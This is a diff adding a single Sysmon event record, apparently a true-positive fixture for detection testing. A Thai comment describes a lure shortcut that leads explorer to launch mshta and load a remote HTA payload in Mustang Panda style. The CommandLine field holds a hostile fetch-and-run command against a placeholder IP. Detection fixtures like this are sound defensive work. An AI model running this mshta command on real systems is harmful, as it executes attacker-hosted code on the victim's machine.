@@ -1,0 +1,10 @@
+{
+  "EventID": 1,
+  "Channel": "Microsoft-Windows-Sysmon/Operational",
+  "Computer": "RTP-WS14.police.example.go.th",
+  "Image": "C:\\Windows\\System32\\mshta.exe",
+  "ParentImage": "C:\\Windows\\explorer.exe",
+  "CommandLine": "mshta.exe https://203.0.113.50/fbi-notice.hta",
+  "User": "CORP\\officer.somchai",
+  "_comment": "TRUE POSITIVE — เหยื่อเปิด shortcut ลวง (เนื้อหา FBI) → explorer เรียก mshta โหลด payload remote (สไตล์ Mustang Panda)"
+}
